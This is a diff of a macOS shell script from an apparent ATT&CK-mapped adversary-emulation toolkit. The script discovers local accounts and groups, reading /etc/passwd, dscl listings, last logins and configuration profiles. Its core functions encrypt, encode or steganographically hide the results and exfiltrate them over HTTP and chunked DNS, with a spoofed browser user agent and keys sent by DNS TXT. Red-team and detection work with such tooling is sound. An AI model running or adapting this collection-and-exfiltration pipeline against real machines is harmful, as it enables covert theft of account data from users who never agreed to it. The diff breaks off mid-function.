@@ -1,26 +1,26 @@
 #!/bin/sh
-# POSIX-compliant shell script - avoid bashisms
-# Script Name: 1087_account_discovery.sh
-# MITRE ATT&CK Technique: 1087
+# POSIX-compliant
+# Procedure Name: local_accounts
+# Tactic: Discovery
+# Technique: T1087.001
+# GUID: 77119f44-a62b-419f-9dcd-831795ef80ba
+# Intent: Identifies valid local accounts and groups on macOS systems using various native commands
 # Author: @darmado | https://x.com/darmad0
-# Date: 2023-10-06
+# created: 2023-10-06
+# Updated: 2025-05-30
 # Version: 1.5.0
+# License: Apache 2.0
 
-# Description:
-# Identifies valid local accounts and groups on macOS systems using various native commands
-# MITRE ATT&CK Tactic: Discovery
-# Procedure GUID: 12345678-1234-5678-9abc-123456789012
-# Generated from YAML procedure definition using build_procedure.py
-# The script uses native macOS commands and APIs for maximum compatibility.
+# Core function Info:
+# This is a standalone base script template that can be used to build any technique.
 
 #------------------------------------------------------------------------------
 # Configuration Section
 #------------------------------------------------------------------------------
-
+NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
-SUBTECHNIQUE_ID=""
+TTP_ID="T1087.001" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -38,7 +38,7 @@ TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
 JOB_ID=""  # Will be set after core functions are defined
 
 # Script Information
-NAME="1087_account_discovery"
+
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
@@ -92,27 +92,6 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-# Logging Settings
-HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
-LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
-LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
-LOG_ENABLED=false
-SYSLOG_TAG="${NAME}"
-
-# Default settings
-DEBUG=false
-ALL=false
-SHOW_HELP=false
-STEG_TRANSFORM=false # Enable steganography transformation
-STEG_EXTRACT=false # Extract hidden data from steganography
-STEG_EXTRACT_FILE="" # File to extract hidden data from
-
-# OPSEC Check Settings (enabled by build script based on YAML configuration)
-CHECK_PERMS="true"
-CHECK_FDA="true"
-CHECK_DB_LOCK="false"
-
 ALL=false
 USER_DIRS=false
 DSCL_USERS=false
@@ -127,10 +106,11 @@ DSCL_GROUPS=false
 ETC_GROUPS=false
 ID_GROUPS=false
 GROUPS_CMD=false
+DEFAULTS_FIND=false
+LAST_LOGINS=false
+PROFILES=false
+PROFILES_ALL=false
 
-NAME="accounts"
-TACTIC="discovery"
-TTP_ID="T1087"
 LOG_FILE="${TTP_ID}_${NAME}.log"
 CMD_LIST_USER_DIRS="ls -la /Users"
 CMD_LIST_DSCL_USERS="dscl . -list /Users"
@@ -144,20 +124,39 @@ CMD_LIST_GROUPS_ETC="grep -v '^#' /etc/group"
 CMD_LIST_GROUPS_ID="id -G"
 CMD_LIST_GROUPS_CMD="groups"
 CMD_LIST_DSCACHEUTIL_USERS="dscacheutil -q user"
+CMD_FIND_USER_DEFAULTS="defaults find NSGlobalDomain"
+CMD_SHOW_LAST_LOGINS="last -n 20"
+CMD_LIST_USER_PROFILES="profiles list"
+CMD_SHOW_USER_PROFILE="profiles show -user"
+CMD_SHOW_ALL_PROFILES="profiles show -all"
 
-# MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with your corresponding tactic
-TTP_ID="T1082" #replace with your corresponding ttp_id
-SUBTECHNIQUE_ID=""
+# Procedure Information (set by build system)
+PROCEDURE_NAME="local_accounts"  # Set by build system from YAML procedure_name field
 
-TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
-TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
-TTP_ID_ENCODE="T1140" # DO NOT MODIFY
-TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
-TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
-TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY
+# Function execution tracking
+FUNCTION_LANG=""  # Ued by log_output at execution time
+
+# Logging Settings
+HOME_DIR="${HOME}"
+LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
+LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
+LOG_ENABLED=false
+SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
+
+# Default settings
+DEBUG=false
+ALL=false
+SHOW_HELP=false
+STEG_TRANSFORM=false # Enable steganography transformation
+STEG_EXTRACT=false # Extract hidden data from steganography
+STEG_EXTRACT_FILE="" # File to extract hidden data from
+
+# OPSEC Check Settings (enabled by build script based on YAML configuration)
+CHECK_PERMS="false"
+CHECK_FDA="true"
+CHECK_DB_LOCK="false"
+
 
 # Output Configuration
 FORMAT=""          # json, csv, or empty for raw
@@ -193,7 +192,7 @@ DEFAULT_STEG_CARRIER="/System/Library/Desktop Pictures/Monterey Graphic.heic"
 # Purpose: Get the current timestamp in a consistent format
 # Inputs: None
 # Outputs: Timestamp string in "YYYY-MM-DD HH:MM:SS" format
-# Side Effects: None
+# - None
 core_get_timestamp() {
     # Use direct command to avoid variable expansion issues
     date "+%Y-%m-%d %H:%M:%S"
@@ -202,7 +201,7 @@ core_get_timestamp() {
 # Purpose: Generate a unique job ID for tracking script execution
 # Inputs: None
 # Outputs: 8-character hexadecimal job ID
-# Side Effects: None
+# - None
 core_generate_job_id() {
     # Use openssl to generate random hex string for job tracking
     # Fallback to date-based ID if openssl not available
@@ -220,7 +219,7 @@ core_generate_job_id() {
 # Purpose: Print debug messages to stderr when debug mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stderr)
-# Side Effects: Writes to stderr if DEBUG=true
+# - Writes to stderr if DEBUG=true
 core_debug_print() {
     if [ "$DEBUG" = true ]; then
         local timestamp=$(core_get_timestamp)
@@ -231,12 +230,12 @@ core_debug_print() {
 # Purpose: Print verbose messages to stdout when verbose mode is enabled
 # Inputs: $1 - Message to print
 # Outputs: None (prints directly to stdout)
-# Side Effects: Writes to stdout if VERBOSE=true
+# - Writes to stdout if VERBOSE=true
 
 # Purpose: Handle errors consistently with proper formatting and logging
 # Inputs: $1 - Error message
 # Outputs: None (prints directly to stderr)
-# Side Effects: 
+# - 
 #   - Writes to stderr
 #   - Logs error message if LOG_ENABLED=true
 #   - Returns error code 1
@@ -258,7 +257,7 @@ core_handle_error() {
 #   $2 - Status type (info, error, etc.), defaults to "info"
 #   $3 - Skip data flag (true/false), defaults to false
 # Outputs: None
-# Side Effects:
+# 
 #   - Creates log directory if it doesn't exist
 #   - Writes to log file if LOG_ENABLED=true
 #   - Rotates log file if size exceeds LOG_MAX_SIZE
@@ -271,7 +270,7 @@ core_log_output() {
     
     if [ "$LOG_ENABLED" = true ]; then
         # Ensure log directory exists
-        if [ ! -d "$LOG_DIR" ]; then
+            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
@@ -285,7 +284,7 @@ core_log_output() {
         fi
         
         # Log detailed entry
-        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
+        "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
             "$(core_get_timestamp)" \
             "$status" \
             "$$" \
@@ -297,7 +296,9 @@ core_log_output() {
             "${FORMAT:-raw}" \
             "$ENCODING_TYPE" \
             "${ENCRYPTION_TYPE:-none}" \
-            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
+            "${EXFIL_TYPE:-none}" \
+            "${FUNCTION_LANG:-shell}" \
+            "$status" >> "$LOG_DIR/$LOG_FILE_NAME"
             
         if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
             "$CMD_PRINTF" "command: %s\\ndata:\\n%s\\n---\\n" \
@@ -309,7 +310,7 @@ core_log_output() {
         fi
 
         # Also log to syslog
-        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
+        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} language=${FUNCTION_LANG:-shell} cmd=\"$SCRIPT_CMD\""
     fi
     
     # Output to stdout if in debug mode only
@@ -323,7 +324,7 @@ core_log_output() {
 #  $1 - Input string to validate
 #  $2 - Validation type (string|integer|domain|url|file_path)
 #Outputs: 0 if valid, 1 if invalid
-#Side Effects: Prints error message to stderr on validation failure
+#- Prints error message to stderr on validation failure
 core_validate_input() {
     local input="$1"
     local validation_type="$2"
@@ -398,7 +399,7 @@ core_validate_input() {
 # Purpose: Extract domain from URL for validation
 # Inputs: $1 - URL string
 # Outputs: Domain part of URL
-# Side Effects: None
+# - None
 core_extract_domain_from_url() {
     local url="$1"
     "$CMD_PRINTF"  "$url" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -407,7 +408,7 @@ core_extract_domain_from_url() {
 # Purpose: Validate that essential commands are available before script execution
 # Inputs: None
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Returns 1 if any essential command is missing
 #   - Calls core_handle_error on missing commands
 core_validate_command() {
@@ -431,7 +432,7 @@ core_validate_command() {
 # Purpose: Check if a domain resolves to a valid IP address
 # Inputs: $1 - Domain to check
 # Outputs: 0 if domain resolves, 1 if not
-# Side Effects: Prints error message if domain doesn't resolve
+# - Prints error message if domain doesn't resolve
 core_validate_domain() {
     local domain="$1"
     
@@ -468,7 +469,7 @@ core_validate_domain() {
 # Purpose: Parse command-line arguments and set global variables (NO VALIDATION)
 # Inputs: $@ - All command-line arguments passed to the script
 # Outputs: None
-# Side Effects: Sets global flag variables based on command-line options
+# - Sets global flag variables based on command-line options
 core_parse_args() {
     # Track unknown arguments and missing values for error reporting
     UNKNOWN_ARGS=""
@@ -639,6 +640,18 @@ core_parse_args() {
         -gg|--groups-cmd)
             GROUPS_CMD=true
             ;;
+        -df|--defaults-find)
+            DEFAULTS_FIND=true
+            ;;
+        -lt|--last-logins)
+            LAST_LOGINS=true
+            ;;
+        -pf|--profiles)
+            PROFILES=true
+            ;;
+        -pa|--profiles-all)
+            PROFILES_ALL=true
+            ;;
             *)
                 # Collect unknown arguments for error reporting
                 if [ -z "$UNKNOWN_ARGS" ]; then
@@ -676,7 +689,6 @@ Basic Options:
   -h, --help           Display this help message
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
-  --ls                 List files in the current directory using ls command
   -a|--all                  Run all account discovery techniques
   -d|--user-dirs            List user directories using 'ls -la /Users'
   -l|--dscl-users           List users using 'dscl . -list /Users'
@@ -691,6 +703,10 @@ Basic Options:
   -ge|--etc-groups          List groups using 'grep /etc/group'
   -gi|--id-groups           List groups using 'id -G'
   -gg|--groups-cmd          List groups using 'groups' command
+  -df|--defaults-find       Find user account info using 'defaults find'
+  -lt|--last-logins         Show last user logins using 'last' command
+  -pf|--profiles            List and show user configuration profiles
+  -pa|--profiles-all        Show all configuration profiles (requires sudo)
 
 Output Options:
   --format TYPE        Output format: 
@@ -738,7 +754,7 @@ EOF
 #   $1 - Raw output data to process
 #   $2 - Data source identifier (defaults to "generic")
 # Outputs: Processed output (formatted/encoded/encrypted as requested)
-# Side Effects:
+# Logic:
 #   - May set global ENCODING_TYPE and ENCRYPTION_TYPE variables
 core_process_output() {
     local output="$1"
@@ -752,10 +768,10 @@ core_process_output() {
     if [ -n "$FORMAT" ]; then
         if [ "$FORMAT" = "json" ] || [ "$FORMAT" = "JSON" ]; then
             # For JSON, only use raw data here - we'll add transformation metadata at the end
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source" "false" "none" "false" "none" "false")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME" "false" "none" "false" "none" "false")
         else
             # For other formats, just format the raw output
-            processed=$(core_format_output "$output" "$FORMAT" "$data_source")
+            processed=$(core_format_output "$output" "$FORMAT" "$PROCEDURE_NAME")
         fi
         core_debug_print "Output formatted as $FORMAT"
     fi
@@ -802,7 +818,7 @@ core_process_output() {
 #   $3 - Data source identifier (defaults to "generic")
 #   $4-7 - Additional parameters for JSON metadata
 # Outputs: Formatted data
-# Side Effects: None
+# - None
 core_format_output() {
     local output="$1"
     local format="$2"
@@ -818,7 +834,7 @@ core_format_output() {
     
     case "$format" in
         json|json-lines)
-            formatted=$(core_format_as_json "$output" "$data_source" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
+            formatted=$(core_format_as_json "$output" "$PROCEDURE_NAME" "$is_encoded" "$encoding" "$is_encrypted" "$encryption" "$is_steganography")
             ;;
         csv)
             formatted=$(core_format_as_csv "$output")
@@ -841,7 +857,7 @@ core_format_output() {
 #   $6 - Encryption method
 #   $7 - Whether steganography is used (true/false)
 # Outputs: JSON-formatted string with data and metadata
-# Side Effects: None
+# - None
 core_format_as_json() {
     local output="$1"
     local data_source="${2:-generic}"
@@ -862,7 +878,7 @@ core_format_as_json() {
     json_output="$json_output
   \"jobId\": \"$JOB_ID\","
     json_output="$json_output
-  \"dataSource\": \"$data_source\","
+  \"procedure\": \"$PROCEDURE_NAME\","
     
     # Always include encoding and encryption status
         json_output="$json_output
@@ -965,7 +981,7 @@ core_format_as_csv() {
 #   $1 - Output data to encode
 #   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
 # Outputs: Encoded data according to specified method
-# Side Effects: None
+# - None
 core_encode_output() {
     local output="$1"
     local encode_type="$2"
@@ -1007,7 +1023,7 @@ core_encode_output() {
 #   $2 - Encryption method (none|aes|gpg|xor)
 #   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
 # Outputs: Encrypted data or original data if no encryption
-# Side Effects: None (delegated to specific encryption functions)
+# - None (delegated to specific encryption functions)
 core_encrypt_output() {
     local data="$1"
     local method="$2"
@@ -1055,7 +1071,7 @@ core_encrypt_output() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: AES-256-CBC encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "aes" on success
 #   - Writes error message to stderr on failure
 encrypt_with_aes() {
@@ -1082,7 +1098,7 @@ encrypt_with_aes() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: GPG symmetrically encrypted data in ASCII armor format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "gpg" on success
 #   - Writes error message to stderr on failure/if GPG not found
 encrypt_with_gpg() {
@@ -1109,7 +1125,7 @@ encrypt_with_gpg() {
 #   $1 - Data to encrypt
 #   $2 - Encryption key
 # Outputs: XOR encrypted data in base64 format
-# Side Effects:
+# Logic:
 #   - Sets global ENCRYPTION_TYPE to "xor" on success
 #   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
 encrypt_with_xor() {
@@ -1149,7 +1165,7 @@ encrypt_with_xor() {
 # Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
 # Inputs: $1 - Data to encode
 # Outputs: Base64 URL-safe encoded data
-# Side Effects: None
+# - None
 core_url_safe_encode() {
     local data="$1"
     local encoded
@@ -1166,7 +1182,7 @@ core_url_safe_encode() {
 # Purpose: DNS-safe encode data for DNS exfiltration
 # Inputs: $1 - Data to encode  
 # Outputs: Base64 DNS-safe encoded data
-# Side Effects: None
+# - None
 core_dns_safe_encode() {
     local data="$1"
     local encoded
@@ -1183,7 +1199,7 @@ core_dns_safe_encode() {
 # Purpose: Generate user agent string for HTTP requests
 # Inputs: None
 # Outputs: User agent string
-# Side Effects: None
+# - None
 core_get_user_agent() {
     $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
 }
@@ -1191,7 +1207,7 @@ core_get_user_agent() {
 # Purpose: Prepare proxy argument for curl if needed
 # Inputs: None - uses global PROXY_URL variable
 # Outputs: Proxy argument for curl or empty string
-# Side Effects: May modify global PROXY_URL to add protocol prefix
+# - May modify global PROXY_URL to add protocol prefix
 core_prepare_proxy_arg() {
     local proxy_arg=""
     
@@ -1208,7 +1224,7 @@ core_prepare_proxy_arg() {
 # Purpose: Normalize URI by ensuring it has http:// prefix
 # Inputs: $1 - URI to normalize
 # Outputs: Normalized URI with protocol prefix
-# Side Effects: None
+# - None
 core_normalize_uri() {
     local uri="$1"
     
@@ -1221,7 +1237,7 @@ core_normalize_uri() {
 # Purpose: Extract domain from a full URI
 # Inputs: $1 - Full URI
 # Outputs: Domain part of the URI
-# Side Effects: None
+# - None
 core_extract_domain() {
     local uri="$1"
     "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
@@ -1231,7 +1247,7 @@ core_extract_domain() {
 # Inputs: 
 #   $1 - Raw data
 # Outputs: Data with optional start/end markers
-# Side Effects: None (uses global EXFIL_START/EXFIL_END)
+# - None (uses global EXFIL_START/EXFIL_END)
 core_prepare_exfil_data() {
     local data="$1"
     
@@ -1249,7 +1265,7 @@ core_prepare_exfil_data() {
 # Inputs:
 #   $1 - Domain to send key to
 # Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
-# Side Effects: Makes DNS request
+# - Makes DNS request
 core_send_key_via_dns() {
     local domain="$1"
     local encrypted_key=""
@@ -1292,7 +1308,7 @@ core_send_key_via_dns() {
 #   $1 - Encoded data
 #   $2 - Optional encrypted key (empty if key sent via DNS)
 # Outputs: JSON payload string
-# Side Effects: None
+# - None
 core_generate_json_payload() {
     local encoded_data="$1"
     local encrypted_key="$2"
@@ -1336,7 +1352,7 @@ EOF
 # Purpose: Determine appropriate content type for HTTP exfiltration
 # Inputs: None (uses global ENCODE variable)
 # Outputs: Content type string
-# Side Effects: None
+# - None
 core_get_content_type() {
     local content_type="text/plain"
     if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
@@ -1351,7 +1367,7 @@ core_get_content_type() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes HTTP request
+# - Makes HTTP request
 core_exfil_http_post() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1397,7 +1413,7 @@ core_exfil_http_post() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple HTTP requests
+# - Makes multiple HTTP requests
 core_exfil_http_get() {
     local data="$1"
     local full_uri=$(core_normalize_uri "$EXFIL_URI")
@@ -1471,7 +1487,7 @@ core_exfil_http_get() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects: Makes multiple DNS requests
+# - Makes multiple DNS requests
 core_exfil_dns() {
     local data="$1"
     
@@ -1547,7 +1563,7 @@ core_exfil_dns() {
 # Inputs:
 #   $1 - Data to exfiltrate
 # Outputs: None
-# Side Effects:
+# Logic:
 #   - Logs exfiltration attempt if LOG_ENABLED=true
 #   - Performs network requests to exfiltrate data
 #   - May modify data for transport (encoding, chunking)
@@ -1601,7 +1617,7 @@ core_exfiltrate_data() {
 # Inputs:
 #   $1 - Processed data (after formatting/encoding/encryption)
 # Outputs: None (writes to various destinations)
-# Side Effects:
+# Logic:
 #   - Logs output if LOG_ENABLED=true
 #   - Exfiltrates data if EXFIL=true
 #   - Always prints data to stdout
@@ -1633,7 +1649,7 @@ core_transform_output() {
 # Purpose: Extract hidden data from a steganography image
 # Inputs: $1 - Image file with hidden data
 # Outputs: Extracted and decoded data
-# Side Effects: None
+# - None
 core_extract_steganography() {
     local steg_file="$1"
     
@@ -1669,7 +1685,7 @@ core_extract_steganography() {
 # Purpose: Perform steganography by hiding data in an image
 # Inputs: None (uses global variables)
 # Outputs: Status message
-# Side Effects: Creates output image file
+# - Creates output image file
 core_steganography() {
     # Define local variables
     local message=""
@@ -1742,7 +1758,7 @@ core_steganography() {
 # Purpose: Apply steganography to data in the processing pipeline
 # Inputs: $1 - Data to hide in steganography
 # Outputs: Status message (actual data is written to file)
-# Side Effects: Creates output image file
+# - Creates output image file
 core_apply_steganography() {
     local data_to_hide="$1"
     local carrier_image=""
@@ -1785,7 +1801,7 @@ core_apply_steganography() {
 #   $3 - Write permission required (true/false)
 #   $4 - Execute permission required (true/false)
 # Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
-# Side Effects: Logs debug information
+# - Logs debug information
 core_check_perms() {
     local file="$1"
     local read_required="$2"
@@ -1814,7 +1830,7 @@ core_check_perms() {
     return 0
 }
 
-# Side Effects: None
+# - None
 # Note: Simple implementation for YAML check_fda
 core_check_fda() {
     [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
@@ -1823,7 +1839,7 @@ core_check_fda() {
 # Purpose: Check if database is locked by another process
 # Inputs: $1 - Database path
 # Outputs: 0 if database is not locked, 1 if locked
-# Side Effects: None
+# - None
 # Note: Comprehensive implementation checking lock files, processes, and database state
 core_check_db_lock() {
     local db_path="$1"
@@ -1915,6 +1931,9 @@ core_main() {
 # Execute main logic
 raw_output=""
 
+# Set global function language for this procedure
+FUNCTION_LANG="shell"
+
 # Execute functions for -a|--all
 if [ "$ALL" = true ]; then
     core_debug_print "Executing functions for -a|--all"
@@ -1941,6 +1960,14 @@ if [ "$ALL" = true ]; then
     result=$(list_groups_cmd)
     raw_output="${raw_output}${result}\n"
     result=$(list_dscacheutil_users)
+    raw_output="${raw_output}${result}\n"
+    result=$(find_user_defaults)
+    raw_output="${raw_output}${result}\n"
+    result=$(show_last_logins)
+    raw_output="${raw_output}${result}\n"
+    result=$(list_user_profiles)
+    raw_output="${raw_output}${result}\n"
+    result=$(show_user_profile_details)
     raw_output="${raw_output}${result}\n"
 fi
 
@@ -2043,8 +2070,38 @@ if [ "$GROUPS_CMD" = true ]; then
     raw_output="${raw_output}${result}\n"
 fi
 
-# Set data source
-data_source="1087_account_discovery"
+# Execute functions for -df|--defaults-find
+if [ "$DEFAULTS_FIND" = true ]; then
+    core_debug_print "Executing functions for -df|--defaults-find"
+    result=$(find_user_defaults)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for -lt|--last-logins
+if [ "$LAST_LOGINS" = true ]; then
+    core_debug_print "Executing functions for -lt|--last-logins"
+    result=$(show_last_logins)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for -pf|--profiles
+if [ "$PROFILES" = true ]; then
+    core_debug_print "Executing functions for -pf|--profiles"
+    result=$(list_user_profiles)
+    raw_output="${raw_output}${result}\n"
+    result=$(show_user_profile_details)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Execute functions for -pa|--profiles-all
+if [ "$PROFILES_ALL" = true ]; then
+    core_debug_print "Executing functions for -pa|--profiles-all"
+    result=$(show_all_profiles)
+    raw_output="${raw_output}${result}\n"
+fi
+
+# Set procedure name for processing
+procedure="local_accounts"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2053,7 +2110,7 @@ data_source="1087_account_discovery"
         fi  
     fi
     # Process the output (format, encode, encrypt)
-    processed_output=$(core_process_output "$raw_output" "$data_source")
+    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
     
     # Handle the final output (log, exfil, or display)
     core_transform_output "$processed_output"
@@ -2063,7 +2120,7 @@ data_source="1087_account_discovery"
 # Purpose: Validate parsed arguments for correctness and security
 # Inputs: None (uses global variables set by core_parse_args)
 # Outputs: 0 if valid, 1 if invalid
-# Side Effects: Prints error messages for invalid arguments but continues execution
+# - Prints error messages for invalid arguments but continues execution
 core_validate_parsed_args() {
     local validation_errors=""
     local has_valid_actions=false
@@ -2195,7 +2252,7 @@ core_validate_parsed_args() {
 # Purpose: Generate encryption key if encryption is enabled
 # Inputs: None (uses global ENCRYPT variable)
 # Outputs: None
-# Side Effects: Sets global ENCRYPT_KEY variable
+# - Sets global ENCRYPT_KEY variable
 core_generate_encryption_key() {
     if [ "$ENCRYPT" != "none" ]; then
         ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
@@ -2211,140 +2268,209 @@ core_generate_encryption_key() {
 # Functions from YAML procedure
 
 # Function: get_user
-# Description: get_user - Generated from YAML procedure
+# Description: get_user - Generated from YAML
 get_user() {
     USER=$(whoami)
 }
 
 
 # Function: get_timestamp
-# Description: get_timestamp - Generated from YAML procedure
+# Description: get_timestamp - Generated from YAML
 get_timestamp() {
     date +"%Y-%m-%d %H:%M:%S"
 }
 
 
 # Function: list_user_dirs
-# Description: list_user_dirs - Generated from YAML procedure
+# Description: list_user_dirs - Generated from YAML
 list_user_dirs() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Discovered user directories; command: \"$CMD_LIST_USER_DIRS\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Discovered user directories; command: \"$CMD_LIST_USER_DIRS\"\n"
     $CMD_LIST_USER_DIRS
     return 0
 }
 
 
 # Function: list_dscl_users
-# Description: list_dscl_users - Generated from YAML procedure
+# Description: list_dscl_users - Generated from YAML
 list_dscl_users() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed users; command: \"$CMD_LIST_DSCL_USERS\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed users; command: \"$CMD_LIST_DSCL_USERS\"\n"
     $CMD_LIST_DSCL_USERS
     return 0
 }
 
 
 # Function: extract_passwd_users
-# Description: extract_passwd_users - Generated from YAML procedure
+# Description: extract_passwd_users - Generated from YAML
 extract_passwd_users() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Retrieved content of /etc/passwd file; command: \"$CMD_EXTRACT_PASSWD_USERS\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Retrieved content of /etc/passwd file; command: \"$CMD_EXTRACT_PASSWD_USERS\"\n"
     $CMD_EXTRACT_PASSWD_USERS
     return 0
 }
 
 
 # Function: show_id_info
-# Description: show_id_info - Generated from YAML procedure
+# Description: show_id_info - Generated from YAML
 show_id_info() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Obtained current user info; command: \"$CMD_SHOW_ID_INFO\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Obtained current user info; command: \"$CMD_SHOW_ID_INFO\"\n"
     $CMD_SHOW_ID_INFO
     return 0
 }
 
 
 # Function: list_logged_users
-# Description: list_logged_users - Generated from YAML procedure
+# Description: list_logged_users - Generated from YAML
 list_logged_users() {
     get_user
-    $CMD_PRINTF "[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\"\n"
+    printf "[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\"\n"
     $CMD_LIST_LOGGED_USERS
     return 0
 }
 
 
 # Function: read_loginwindow_plist
-# Description: read_loginwindow_plist - Generated from YAML procedure
+# Description: read_loginwindow_plist - Generated from YAML
 read_loginwindow_plist() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Read content of loginwindow plist; command: \"$CMD_READ_LOGINWINDOW_PLIST\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Read content of loginwindow plist; command: \"$CMD_READ_LOGINWINDOW_PLIST\"\n"
     $CMD_READ_LOGINWINDOW_PLIST
     return 0
 }
 
 
 # Function: list_groups_dscacheutil
-# Description: list_groups_dscacheutil - Generated from YAML procedure
+# Description: list_groups_dscacheutil - Generated from YAML
 list_groups_dscacheutil() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCACHEUTIL\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCACHEUTIL\"\n"
     $CMD_LIST_GROUPS_DSCACHEUTIL
     return 0
 }
 
 
 # Function: list_groups_dscl
-# Description: list_groups_dscl - Generated from YAML procedure
+# Description: list_groups_dscl - Generated from YAML
 list_groups_dscl() {
     get_user
-    $CMD_PRINTF "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCL\"\n"
+    printf "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCL\"\n"
     $CMD_LIST_GROUPS_DSCL
     return 0
 }
 
 
 # Function: list_groups_etc
-# Description: list_groups_etc - Generated from YAML procedure
